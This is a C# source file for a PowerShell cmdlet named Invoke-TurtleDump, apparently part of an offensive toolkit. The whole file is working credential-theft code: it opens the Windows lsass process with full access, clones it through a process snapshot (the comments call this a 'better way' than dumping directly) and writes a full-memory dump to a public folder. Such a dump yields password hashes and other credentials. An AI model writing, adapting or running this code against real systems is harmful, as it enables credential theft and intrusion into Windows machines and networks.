using System;
using System.Management.Automation;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using TurtleToolKitManaged;

namespace TurtleToolKit
{
    [Cmdlet(VerbsLifecycle.Invoke, "TurtleDump")] // <- seeting cmdlet name and verbs
    [Alias("INVDMP")] //<- cmdlet alias
    public class InvokeTurtleDump : Cmdlet
    {
        protected override void BeginProcessing()
        {
            base.BeginProcessing();
        }

        // Process each item in pipeline
        protected override void ProcessRecord()
        {
            base.ProcessRecord();
            if (!ExecuteTurtledump())
            {
                WriteWarning("failed turtle dump");
                return;
            }
            WriteVerbose("Succesfully completed turtle dump");
        }
        // EndProcessing Used to clean up cmdlet
        protected override void EndProcessing() { base.EndProcessing(); }
        // Handle abnormal termination
        protected override void StopProcessing() { base.StopProcessing(); }

        public static bool ExecuteTurtledump()
        {
            FileStream dumpFile = new FileStream("C:\\Users\\Public\\turtleDmp.dmp",FileMode.Create);
            Process[] proc = Process.GetProcessesByName("lsass");
            int pid = proc[0].Id;
            IntPtr handle = Win32.OpenProcess(0x001F0FFF, false, pid);
            IntPtr snapshotHandle;
            //og way
            //int dumped = Win32.MiniDumpWriteDump(handle, pid, dumpFile.SafeFileHandle.DangerousGetHandle(), Win32.MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            // better way
            Win32.PSS_CAPTURE_FLAGS snapFlags = Win32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_VA_CLONE
              | Win32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLES
              | Win32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_NAME_INFORMATION
              | Win32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_BASIC_INFORMATION
              | Win32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION
              | Win32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_TRACE
              | Win32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREADS
              | Win32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREAD_CONTEXT
              | Win32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREAD_CONTEXT_EXTENDED
              | Win32.PSS_CAPTURE_FLAGS.PSS_CREATE_BREAKAWAY_OPTIONAL
              | Win32.PSS_CAPTURE_FLAGS.PSS_CREATE_BREAKAWAY
              | Win32.PSS_CAPTURE_FLAGS.PSS_CREATE_RELEASE_SECTION
              | Win32.PSS_CAPTURE_FLAGS.PSS_CREATE_USE_VM_ALLOCATIONS;
            // DWORD hr = PssCaptureSnapshot(handle, flags, IntPtr.Size == 8 ? 0x0010001F : 0x0001003F, out snapshotHandle);
            int hr = Win32.PssCaptureSnapshot(handle, snapFlags, (int)Win32.CONTEXT_FLAGS.CONTEXT_ALL, out snapshotHandle);
            Win32.MINIDUMP_CALLBACK_INFORMATION callbackInfo = new Win32.MINIDUMP_CALLBACK_INFORMATION();
            callbackInfo.CallbackParam = IntPtr.Zero;
            callbackInfo.CallbackRoutine = IntPtr.Zero;
            var callbackDelegate = new Win32.MiniDumpCallback(Win32.ATPDumpCallbackMethod);
            var callbackParam = Marshal.AllocHGlobal(IntPtr.Size * 2);
            unsafe
            {
                var ptr = (Win32.MINIDUMP_CALLBACK_INFORMATION*)callbackParam;
                ptr->CallbackRoutine = Marshal.GetFunctionPointerForDelegate(callbackDelegate);
                ptr->CallbackParam = IntPtr.Zero;
            }
            int result = Win32.MiniDumpWriteDump(snapshotHandle, pid, dumpFile.SafeFileHandle.DangerousGetHandle(), Win32.MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, callbackParam);
            if (result == 0)
            {
                Console.WriteLine($"MiniDumpWriteDump failed. ({Marshal.GetHRForLastWin32Error()})");
                dumpFile.Close();
                return false;
            }
            dumpFile.Close();
            return true;
        }

    }
}
